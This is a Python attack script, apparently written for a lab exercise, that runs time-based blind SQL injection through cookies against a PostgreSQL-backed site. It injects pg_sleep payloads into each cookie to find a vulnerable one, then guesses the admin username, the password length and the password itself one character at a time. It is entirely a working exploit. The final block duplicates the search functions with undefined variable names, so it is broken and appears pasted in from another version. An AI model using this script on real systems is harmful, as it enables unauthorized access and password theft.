import urllib.parse
import time
import requests
import sys


requests.packages.urllib3.disable_warnings()
session = requests.Session()

userList = ['user','admin','administrator','root']
charSet = '0123456789abcdefghijklmnopqrstuvwxyz'
headers = {
    "User-Agent": "Mozilla/5.0"
}

url = sys.argv[1]
resCookies = session.get(url,verify=False,headers=headers).cookies
cookie_dict = resCookies.get_dict()
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
vulCookie = None
vulUsername = None
vulPassword = ''
passwordLen = None

print('[*] Checking for vulnerabilties in cookies...')
for cookie in cookie_dict:
	cookie_temp = cookie_dict.copy()
	cookie_temp[cookie] = urllib.parse.quote(cookie_temp[cookie] + "'; select pg_sleep(5)--")
	t1 = time.time()
	response = session.get(url,cookies=cookie_temp,proxies=proxies,verify=False,headers=headers)
	t2 = time.time()
	if(4.5<(t2-t1)):
		vulCookie = cookie

if(vulCookie == None):
	print("[-] No vulnerabilities found")
	sys.exit()
print(f"[+] Vulnerable cookie -> {vulCookie}")

print(f"[*] Finding Username...")
for user in userList:
	cookie_temp = cookie_dict.copy()
	payload = f"'; select case when username='{user}' then pg_sleep(5) else pg_sleep(0) end from users--"
	cookie_temp[vulCookie] = urllib.parse.quote(cookie_temp[vulCookie] + payload)
	t1 = time.time()
	response = session.get(url,cookies=cookie_temp,proxies=proxies,verify=False,headers=headers)
	t2 = time.time()
	if(4.5<(t2-t1)):
		vulUsername=user
		break
if(vulUsername==None):
	print("[-] Username can't be found")
	sys.exit()
print(f"[+] Username -> {vulUsername}") 

for i in range(0,25):
	cookie_temp = cookie_dict.copy()
	payload = f"'; select case when (username='{vulUsername}' and length(password)={i}) then pg_sleep(5) else pg_sleep(0) end from users--"
	cookie_temp[vulCookie] = urllib.parse.quote(cookie_temp[vulCookie] + payload)
	t1 = time.time()
	response = session.get(url,cookies=cookie_temp,proxies=proxies,verify=False,headers=headers)
	t2 = time.time()
	if(4.5<(t2-t1)):
		passwordLen = i
		break
print(f"[+] Length of password -> {passwordLen}")

def check(op,chr,loc):
	payload = f"'; SELECT CASE WHEN (username='{vulUsername}' AND ascii(substr(password,{loc},1)){op}{chr}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--"
	cookie_temp = cookie_dict.copy()
	cookie_temp[vulCookie] = urllib.parse.quote(cookie_temp[vulCookie] + payload)
	t1 = time.time()
	response = session.get(url,cookies=cookie_temp,proxies=proxies,verify=False,headers=headers)
	t2 = time.time()
	return 4.5<(t2-t1)

def binarySearch(loc):
	low = 0
	high = len(charSet)-1
	while low <= high:
		mid = (low + high)//2
		ascii_val = ord(charSet[mid])
		if check('<', ascii_val, loc):
			high = mid - 1
		elif check('>', ascii_val, loc):
			low = mid + 1
		else:
			return charSet[mid]
	return '?'


print("[*] Getting password...")

for i in range(1,passwordLen+1):
	vulPassword += binarySearch(i)
	print(f"[{i}]->{vulPassword}")
print(f"[+] password -> {vulPassword}")

def is_char(operator, ascii_val, pos):
    payload = f"'; SELECT CASE WHEN (username='{valid_user}' AND ascii(substr(password,{pos},1)){operator}{ascii_val}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users--"
    test_cookie = cookie_dict.copy()
    test_cookie[vuln_cookie] += urllib.parse.quote(payload)
    t1 = time.time()
    session.get(url, cookies=test_cookie, verify=False, proxies=proxies, headers=headers)
    t2 = time.time()
    return (t2 - t1) > threshold

def binary_search(pos):
    low = 0
    high = len(charset) - 1
    while low <= high:
        mid = (low + high) // 2
        ascii_val = ord(charset[mid])
        if is_char('<', ascii_val, pos):
            high = mid - 1
        elif is_char('>', ascii_val, pos):
            low = mid + 1
        else:
            return charset[mid]
    return '?'

for i in range(1, password_length + 1):
    char = binary_search(i)
    password += char
    print(f"[{i}] -> {password}")